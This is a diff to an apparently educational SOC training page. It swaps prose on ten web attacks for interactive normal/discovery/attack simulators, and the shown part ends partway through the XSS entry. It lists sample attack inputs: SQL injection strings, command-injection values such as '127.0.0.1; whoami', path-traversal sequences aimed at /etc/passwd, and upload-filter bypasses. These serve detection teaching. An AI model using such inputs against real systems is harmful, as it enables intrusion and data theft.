@@ -89,6 +89,53 @@
 .logq-note{padding:9px 12px;background:#0d1526;color:#8ea3c9;font-size:12.5px;line-height:1.55;border-top:1px solid #1a2740;font-family:var(--font)}
 .logq-note b{color:#e8edf7}.logq-note .k{color:#5ee39b}
 
+/* ---- Interactive attack simulator (Normal → Discovery → Attack) ---- */
+.sim{border:1px solid #1f2d52;border-radius:12px;background:#0e1730;margin:18px 0;overflow:hidden}
+.sim-head{display:flex;flex-wrap:wrap;gap:12px;align-items:center;justify-content:space-between;
+          padding:11px 15px;border-bottom:1px solid #1f2d52;background:#101a36}
+.sim-title{font-weight:600;color:#e8edf7;font-size:14px}
+.sim-title span{color:#8ea3c9;font-weight:400;font-size:12.3px}
+.sim-ctrls{display:flex;gap:7px;flex-wrap:wrap;align-items:center}
+.sim-btn{background:#132244;border:1px solid #2a3c68;color:#c7d3ea;border-radius:7px;
+         padding:6px 12px;font:inherit;font-size:12.5px;cursor:pointer;transition:.15s}
+.sim-btn:hover{border-color:#37c7d4;color:#fff}
+.sim-btn.on{background:#16305c;border-color:#37c7d4;color:#fff;box-shadow:0 0 0 1px #37c7d4 inset}
+.sim-btn.warnb.on{background:#3a2a14;border-color:#f0c860;color:#ffe9b0;box-shadow:0 0 0 1px #f0c860 inset}
+.sim-btn.bad.on{background:#3a1a24;border-color:#e0556b;color:#ffd9df;box-shadow:0 0 0 1px #e0556b inset}
+/* visual flow stage */
+.sim-viz{padding:10px 12px 4px;border-bottom:1px solid #16223f;background:#0b1220}
+.sim-viz svg{width:100%;height:auto;display:block}
+/* stage: request → response */
+.sim-stage{display:grid;grid-template-columns:1fr 1fr;gap:0;border-bottom:1px solid #16223f}
+.sim-col{padding:11px 14px}
+.sim-col:first-child{border-right:1px solid #16223f}
+.sim-col .lb{display:block;font-size:10.5px;letter-spacing:.7px;text-transform:uppercase;
+             color:#8ea3c9;margin-bottom:6px;font-weight:700}
+.sim-col pre{margin:0;font-family:var(--mono,monospace);font-size:12.2px;line-height:1.62;
+             color:#c7d3ea;white-space:pre-wrap;word-break:break-word}
+.sim-col.req pre{color:#9fd0ff}
+.sim-col.res pre{color:#9fe6bd}
+.sim.is-probe .sim-col.req pre{color:#ffe9b0}
+.sim.is-probe .sim-col.res pre{color:#ffd9a0}
+.sim.is-attack .sim-col.req pre{color:#ffb3bf}
+.sim.is-attack .sim-col.res pre{color:#ff9db0}
+/* verdict strip */
+.sim-verdict{display:flex;align-items:center;gap:9px;padding:9px 15px;border-bottom:1px solid #16223f;
+             background:#0b1220;font-size:13px}
+.sim-verdict .dot{width:9px;height:9px;border-radius:50%;background:#3fa87a;flex:none}
+.sim.is-probe .sim-verdict .dot{background:#f0c860}
+.sim.is-attack .sim-verdict .dot{background:#e0556b}
+.sim-verdict b{color:#7fe0a0}
+.sim.is-probe .sim-verdict b{color:#ffd98a}
+.sim.is-attack .sim-verdict b{color:#ff9db0}
+.sim-verdict i{font-style:normal;color:#8ea3c9}
+.sim-cap{padding:11px 15px;color:#8ea3c9;font-size:13.1px;line-height:1.6;min-height:56px}
+.sim-cap b{color:#e8edf7}
+.sim-cap .k{font-family:var(--mono,monospace);color:#5ee39b;font-size:12.3px}
+@media(max-width:760px){.sim-stage{grid-template-columns:1fr}
+  .sim-col:first-child{border-right:none;border-bottom:1px solid #16223f}
+  .sim-head{flex-direction:column;align-items:flex-start}}
+
 /* ---- S3 attack-story components ---- */
 /* numbered attack-flow steps */
 .aflow{counter-reset:af;margin:16px 0;padding:0;list-style:none}
@@ -1703,22 +1750,25 @@ Content-Length: 98
         an attacker ever does — and therefore your best chance to stop them early.</strong></p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A real user reaches pages by <em>following links</em>. Their journey is small, ordered and referred:
-        home → products → product detail → cart. Each request carries a <span class="mono">Referer</span> from
-        the previous page, arrives seconds apart, and returns <strong>200</strong>. A human generates perhaps
-        20–40 requests exploring a site.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Not a vulnerability — the <strong>attack surface itself</strong>. The attacker wants a map: admin
-        panels, login pages, upload forms, backups, <span class="mono">.git</span> directories, old versions,
-        test pages. Anything the developers forgot is worth more than anything they secured.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>The server itself is the oracle. It answers <strong>404</strong> for paths that don't exist and
-        <strong>200</strong>/<strong>403</strong> for paths that do — and that difference is all the attacker
-        needs. A <strong>403 Forbidden</strong> is arguably a better find than a 200: it confirms something is
-        there and someone bothered to protect it.</p>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="recon">
+        <div class="sim-head">
+          <div class="sim-title">Content Discovery <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> the attack surface itself — admin panels, uploads, backups, <span class="mono">.git</span>. Anything the developers forgot is worth more than anything they secured.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <ol class="aflow">
@@ -1777,23 +1827,25 @@ Content-Length: 98
         attacker simply asks it to do that <strong>ten thousand times</strong>.</p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A user submits a <span class="mono">POST</span> to <span class="mono">/login</span>. Typically one
-        attempt, occasionally two or three if they mistype. Success is a <strong>302</strong> redirect to their
-        account page; failure returns the login page again with an error. A handful of requests, spread over
-        seconds, from a residential IP, with a real browser User-Agent.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>The authentication endpoint found in Attack 01. The attacker wants <strong>one working credential
-        pair</strong> — after which every action they take is authenticated, legitimate-looking, and far harder
-        for you to spot.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>Two questions decide whether this is worth attempting:</p>
-      <ul>
-        <li><strong>Is there rate limiting or lockout?</strong> They send five deliberate failures and see whether the sixth is refused. Silence means unlimited attempts.</li>
-        <li><strong>Does it leak valid usernames?</strong> If "unknown user" and "wrong password" produce different messages — or measurably different response <em>times</em> or <em>sizes</em> — the attacker first enumerates valid accounts, then attacks only those. One unknown becomes two knowns.</li>
-      </ul>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="brute">
+        <div class="sim-head">
+          <div class="sim-title">Brute Force <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> the login endpoint found during recon. One working credential pair makes everything afterwards look legitimate.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <ol class="aflow">
@@ -1872,24 +1924,25 @@ Content-Length: 98
         instruction and the database has no way to tell the difference.</p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A user searches for <span class="mono">shoes</span>. The app builds
-        <span class="mono">SELECT name, price FROM products WHERE name = 'shoes'</span>, the database returns
-        matching rows, and the page shows a handful of products. Status <strong>200</strong>, consistent
-        response size, one request.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Any input that ends up in a query: search fields, login forms, <span class="mono">?id=</span>
-        parameters, sort/filter options, even HTTP headers that get logged into a database. The prize is the
-        <strong>database itself</strong> — credentials, customers, payment data.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>The attacker submits a single apostrophe (<span class="mono">'</span>) and watches what happens:</p>
-      <ul>
-        <li><strong>A database error appears</strong> → the input reached the SQL engine and broke its syntax. Confirmed, and the error may even name the DB engine.</li>
-        <li><strong>A 500 status with a generic page</strong> → same conclusion, less detail. <em>This is the spike you see in your logs.</em></li>
-        <li><strong>Nothing changes visibly</strong> → test with boolean logic (<span class="mono">' OR '1'='1</span> vs <span class="mono">' AND '1'='2</span>) and compare responses, or use a time delay to make the server pause. That is <strong>blind SQL injection</strong>.</li>
-      </ul>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="sqli">
+        <div class="sim-head">
+          <div class="sim-title">SQL Injection <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> any input that reaches a query — search, login, <span class="mono">?id=</span>, filters. The prize is the database itself.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <ol class="aflow">
@@ -1964,20 +2017,25 @@ Content-Length: 98
           <span class="src">Source: TryHackMe — Detecting Web Attacks</span></figcaption>
       </figure>
 
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A user posts a comment: <span class="mono">Great product!</span>. The app stores it and renders it on
-        the page for other visitors. Text in, text out — the browser displays it as words.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Anywhere user input is <strong>reflected back into a page</strong>: comments, profile names, search
-        result headers ("You searched for …"), error messages, URL parameters. The target is not the server —
-        it is <strong>the next person to load that page</strong>, and specifically their session cookie.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>Submit a harmless marker such as <span class="mono">&lt;b&gt;test&lt;/b&gt;</span> or a unique string,
-        then view the page source. If it comes back as <strong>bold text</strong> (rather than the literal
-        characters), the input is being parsed as HTML — meaning a <span class="mono">&lt;script&gt;</span> tag
-        will run too. That is the whole test.</p>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="xss">
+        <div class="sim-head">
+          <div class="sim-title">Cross-Site Scripting <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> anywhere user input is reflected into a page — and through it, <strong>the next visitor’s session token</strong>.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <p>Three variants, in ascending order of how much they should worry you:</p>
@@ -2055,23 +2113,25 @@ Content-Length: 98
         web server's user, and persistent across reboots.</p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A user uploads <span class="mono">avatar.jpg</span>. The app stores it under
-        <span class="mono">/uploads/</span> and later serves it back with
-        <span class="mono">Content-Type: image/jpeg</span>. The web server <em>reads</em> the file and sends the
-        bytes. It never <em>executes</em> it.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Any upload feature — avatars, CVs, support attachments, bulk import. The goal is <strong>arbitrary code
-        execution</strong>: the top of the value chain, because from here everything else (data theft, lateral
-        movement, ransomware staging) becomes possible.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>The attacker needs two conditions to hold at once:</p>
-      <ol class="aflow">
-        <li><b>Can I upload a script?</b> Try <span class="mono">.php</span>, then bypasses: double extension (<span class="mono">image.jpg.php</span>), a spoofed <span class="mono">Content-Type</span>, a fake magic-number header, or a null byte.</li>
-        <li><b>Where does it land, and will it execute?</b> Upload a harmless image first and note the URL it is served from. That path is where the shell will go — and if the directory permits execution, the attack works.</li>
-      </ol>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="shell">
+        <div class="sim-head">
+          <div class="sim-title">File Upload → Web Shell <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> any upload feature. The goal is arbitrary code execution — the top of the value chain.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <p>This is the sequence, and it is the one you must be able to recognise in a log at a glance:</p>
@@ -2162,27 +2222,25 @@ Content-Length: 98
         appended one of their own.</p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A feature legitimately shells out to the operating system: a network-diagnostics page running
-        <span class="mono">ping</span>, a converter calling <span class="mono">ffmpeg</span>, a report generator
-        invoking a PDF tool. The app builds a command like
-        <span class="mono">ping -c 4 192.168.1.1</span> and returns the output.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Any input that becomes part of a system command — hostnames, filenames, format options, export
-        parameters. The attacker wants <strong>direct execution as the web server user</strong>, and unlike a
-        web shell it leaves no artefact to find later.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>They append a shell metacharacter and see whether two commands run instead of one:</p>
-      <ul>
-        <li><span class="mono">;</span> — run the next command regardless (<span class="mono">127.0.0.1; whoami</span>)</li>
-        <li><span class="mono">&amp;&amp;</span> / <span class="mono">|</span> — chain or pipe</li>
-        <li><span class="mono">`cmd`</span> or <span class="mono">$(cmd)</span> — command substitution</li>
-      </ul>
-      <p>If the response contains the output of <em>both</em> commands, it is confirmed. If the page returns
-        nothing useful, they test <strong>blind</strong> — inject <span class="mono">sleep 10</span> and time
-        the response, or trigger an outbound DNS lookup to a domain they control.</p>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="cmdi">
+        <div class="sim-head">
+          <div class="sim-title">OS Command Injection <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> input that becomes part of a system command — hostnames, filenames, export options. Runs as the web server user.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <ol class="aflow">
@@ -2242,22 +2300,25 @@ Content-Length: 98
         filesystem</strong> — using nothing more exotic than <span class="mono">../</span>.</p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A page loads an image or document via a filename parameter:
-        <span class="mono">/download?file=report.pdf</span>. The app joins that name onto a base directory —
-        <span class="mono">/var/www/files/</span> + <span class="mono">report.pdf</span> — reads the file and
-        returns it. Users only ever see the handful of names the UI links to.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Any parameter carrying a filename or path. The attacker wants files the web root was never meant to
-        expose: <span class="mono">/etc/passwd</span> to confirm the flaw, then <strong>application config
-        files containing database credentials</strong>, SSH keys, source code, and log files.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>Replace the filename with a traversal sequence and see what comes back. <span class="mono">../</span>
-        means "parent directory", so enough of them reach the filesystem root regardless of where the app
-        started. Encoded variants (<span class="mono">%2e%2e%2f</span>, double-encoded
-        <span class="mono">%252e%252e%252f</span>) exist purely to slip past naive filters.</p>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="trav">
+        <div class="sim-head">
+          <div class="sim-title">Path Traversal <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> any parameter carrying a filename. The real prize is config files holding database and cloud credentials.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <ol class="aflow">
@@ -2317,28 +2378,25 @@ Content-Length: 98
         with a <span class="mono">200 OK</span>.</p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A logged-in user opens their invoice: <span class="mono">GET /invoice?id=1043</span>. The app looks up
-        invoice 1043 and renders it. The user only ever sees IDs the interface links to, so from the outside it
-        looks like the system is enforcing something. It isn't — it is simply not showing them the other links.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Any object addressed by a predictable identifier: invoices, orders, messages, documents, user
-        profiles, API records. The attacker wants <strong>bulk data belonging to other users</strong> — and
-        because IDs are usually sequential, they can have all of it.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>Change <span class="mono">1043</span> to <span class="mono">1042</span>. That is the entire discovery
-        process. If the response is another user's invoice instead of <strong>403 Forbidden</strong>, the
-        vulnerability is confirmed in one request.</p>
-
-      <div class="box soc">
-        <span class="box-t">You have already done this twice in this session</span>
-        <p>Section 1's HTTP emulator: you sent <span class="mono">DELETE /user/1</span> and
-          <span class="mono">PUT /user/2</span>, and nothing asked whether those accounts were yours. Section 2
-          named it A01. Now you are seeing it as the SOC sees it — which is to say, <strong>barely at
-          all</strong>.</p>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="idor">
+        <div class="sim-head">
+          <div class="sim-title">IDOR <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
       </div>
+      <p><strong>Target:</strong> any object addressed by a predictable identifier — invoices, orders, messages, profiles, API records.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <ol class="aflow">
@@ -2397,22 +2455,26 @@ Content-Length: 98
         server to go and fetch it for them — and it does, because it was built to fetch URLs.</p>
     </div>
     <div class="content">
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>A feature fetches a remote resource on the user's behalf: a link-preview generator, a webhook tester, a
-        "import image from URL" field, a PDF renderer pulling assets. The user supplies
-        <span class="mono">https://example.com/logo.png</span>; the server retrieves it and returns or stores
-        the result.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>The URL parameter itself. The prize is not the web app — it is <strong>everything the web server can
-        reach that the attacker cannot</strong>: cloud metadata endpoints holding temporary credentials,
-        internal admin panels that assume "inside = trusted", databases bound to localhost, and other internal
-        hosts to port-scan by proxy.</p>
-
-      <h3 class="st"><span class="n">03</span> Vulnerability discovery</h3>
-      <p>Point the parameter at a host the attacker controls and watch their own logs. If a connection arrives
-        <em>from your server's IP</em>, SSRF is confirmed — even if the application shows them nothing at all.
-        That is <strong>blind SSRF</strong>, and it is the common case.</p>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="ssrf">
+        <div class="sim-head">
+          <div class="sim-title">SSRF <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> the URL parameter — and through it, everything your server can reach that the
+        attacker cannot: cloud metadata, internal admin panels, localhost services.</p>
 
       <h3 class="st"><span class="n">04</span> Attack flow</h3>
       <ol class="aflow">
@@ -2487,14 +2549,26 @@ Content-Length: 98
       <p style="text-align:center;color:var(--text-3);font-size:12.5px;font-style:italic;margin-top:-4px">
         Source: TryHackMe — Detecting Web DDoS</p>
 
-      <h3 class="st"><span class="n">01</span> Normal behaviour</h3>
-      <p>Traffic follows a daily rhythm: a morning ramp, a lunchtime peak, an evening decline. Requests spread
-        across many pages, from many IPs, with diverse browser User-Agents, from the geographies where your
-        customers actually live. Response times are stable and status codes are overwhelmingly 2xx/3xx.</p>
-
-      <h3 class="st"><span class="n">02</span> Attack target</h3>
-      <p>Not data — <strong>capacity</strong>. Attackers deliberately choose the <em>most expensive</em>
-        endpoints, because each request costs the server far more than it costs them:</p>
+      <h3>Walk it through — normal, then the weakness, then the attack</h3>
+      <div class="sim" data-atk="dos">
+        <div class="sim-head">
+          <div class="sim-title">Denial of Service <span>— step through each state</span></div>
+          <div class="sim-ctrls">
+            <button type="button" class="sim-btn on" data-st="normal">1 · Normal</button>
+            <button type="button" class="sim-btn warnb" data-st="probe">2 · Find the weakness</button>
+            <button type="button" class="sim-btn bad" data-st="attack">3 · Attack</button>
+          </div>
+        </div>
+        <div class="sim-viz" data-slot="viz"></div>
+        <div class="sim-stage">
+          <div class="sim-col req"><span class="lb">Request</span><pre data-slot="req"></pre></div>
+          <div class="sim-col res"><span class="lb">Response</span><pre data-slot="res"></pre></div>
+        </div>
+        <div class="sim-verdict"><span class="dot"></span><b data-slot="v"></b><i data-slot="vi"></i></div>
+        <div class="sim-cap" data-slot="cap"></div>
+      </div>
+      <p><strong>Target:</strong> not data — <strong>capacity</strong>. Attackers pick the endpoints that cost
+        the server most per request:</p>
       <table>
         <thead><tr><th>Endpoint</th><th>Why it is expensive</th></tr></thead>
         <tbody>
@@ -2687,6 +2761,359 @@ Content-Length: 98
   </div>
 </div>
 
+<script>
+/* ==========================================================================
+   Session 09 — attack simulators
+   One engine, ten attacks. Each attack has three states the student steps
+   through: NORMAL → DISCOVERY (how the attacker finds it) → ATTACK.
+   ========================================================================== */
+(function () {
+  'use strict';
+
+  var A = {
+
+    /* ---------------- 01 Content discovery ---------------- */
+    recon: {
+      title: 'Content Discovery',
+      normal: {
+        req: 'GET /products HTTP/1.1\nReferer: https://shop.local/\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)',
+        res: 'HTTP/1.1 200 OK\nContent-Length: 8573',
+        v: 'Normal', vi: 'a human, following a link',
+        cap: '<b>One page, referred from the last one.</b> A real visitor generates maybe 20–40 requests, seconds apart, each carrying a <span class="k">Referer</span>. That rhythm is your baseline.'
+      },
+      probe: {
+        req: 'GET /admin      HTTP/1.1\nGET /backup     HTTP/1.1\nGET /.git/      HTTP/1.1\nUser-Agent: gobuster/1.9   (no Referer)',
+        res: 'HTTP/1.1 404 Not Found\nHTTP/1.1 404 Not Found\nHTTP/1.1 404 Not Found\n… ×200 more',
+        v: 'Discovery', vi: 'the server answers honestly',
+        cap: '<b>The server is the oracle.</b> It says <span class="k">404</span> for what does not exist and <span class="k">200</span>/<span class="k">403</span> for what does — and that difference is the entire discovery method. No exploit involved.'
+      },
+      attack: {
+        req: 'GET /login.php  HTTP/1.1\nGET /uploads/   HTTP/1.1\nUser-Agent: gobuster/1.9',
+        res: 'HTTP/1.1 200 OK   ← found\nHTTP/1.1 200 OK   ← found',
+        v: 'Found', vi: 'the map is drawn',
+        cap: '<b>Two hits inside 200 misses.</b> Everything the attacker does next targets only what this scan found. <b>Your detection is the same event:</b> a wall of 404s from one IP — then pivot to that IP’s 200s to see exactly what they now know.'
+      }
+    },
+
+    /* ---------------- 02 Brute force ---------------- */
+    brute: {
+      title: 'Brute Force',
+      normal: {
+        req: 'POST /login HTTP/1.1\nContent-Length: 44\n\n(username + password in the body)',
+        res: 'HTTP/1.1 302 Found\nLocation: /account',
+        v: 'Normal', vi: 'one attempt, straight in',
+        cap: '<b>A real login is one request.</b> Note the body is where the credentials live — <b>and the access log never records it.</b> You can see that a login happened, never what was typed.'
+      },
+      probe: {
+        req: 'POST /login   username=admin&…\nPOST /login   username=zzzz&…',
+        res: 'HTTP/1.1 401  "Incorrect password"\nHTTP/1.1 401  "Invalid username"',
+        v: 'Discovery', vi: 'the two errors differ',
+        cap: '<b>Username enumeration.</b> Different wording (or a different response size or timing) for “bad user” vs “bad password” turns one unknown into two knowns. The attacker now attacks only accounts that exist — and checks whether attempt #6 is ever refused.'
+      },
+      attack: {
+        req: 'POST /login  ×160\nUser-Agent: Hydra\nsource: 167.172.41.141',
+        res: '401 × 159\nHTTP/1.1 302 Found  ← one worked',
+        v: 'Compromise', vi: 'account taken over',
+        cap: '<b>The signature is the transition, not the count.</b> Many <span class="k">401</span>s then a <span class="k">302</span>. Failures alone are background noise; failures <i>followed by a success</i> is an incident. Alert on the change of state.'
+      }
+    },
+
+    /* ---------------- 03 SQL injection ---------------- */
+    sqli: {
+      title: 'SQL Injection',
+      normal: {
+        req: "GET /search?q=shoes HTTP/1.1",
+        res: 'HTTP/1.1 200 OK\nContent-Length: 1861\n\n3 products found',
+        v: 'Normal', vi: "SELECT … WHERE name = 'shoes'",
+        cap: '<b>Input is treated as data.</b> The word <span class="k">shoes</span> goes into the query as a value and three rows come back. Note the response size — remember it.'
+      },
+      probe: {
+        req: "GET /search?q=' HTTP/1.1",
+        res: 'HTTP/1.1 500 Internal Server Error\n\nSQL syntax error near …',
+        v: 'Discovery', vi: 'one apostrophe',
+        cap: '<b>The quote broke the query.</b> That error proves the input reached the SQL engine and is not being escaped. <b>This is the 500 spike you see in your logs</b> — probing, before anything is stolen. If the app hides errors, the attacker switches to boolean or time-based tests (blind SQLi).'
+      },
+      attack: {
+        req: "GET /search?q=' OR '1'='1 HTTP/1.1\nUser-Agent: sqlmap/1.7.2",
+        res: 'HTTP/1.1 200 OK\nContent-Length: 94210   ← 50× larger\n\nadmin, Gordon Brown, Jane Lee…',
+        v: 'Data stolen', vi: 'the Users table came back',
+        cap: '<b>Data crossed into code.</b> The quote closed the string, so <span class="k">OR \'1\'=\'1</span> became <i>instruction</i>. In a GET the payload is fully logged — and the <b>response-size jump</b> is what tells you it actually worked, not just that it was attempted.'
+      }
+    },
+
+    /* ---------------- 04 XSS ---------------- */
+    xss: {
+      title: 'Cross-Site Scripting',
+      normal: {
+        req: 'POST /comment\n\ncomment=Great product!',
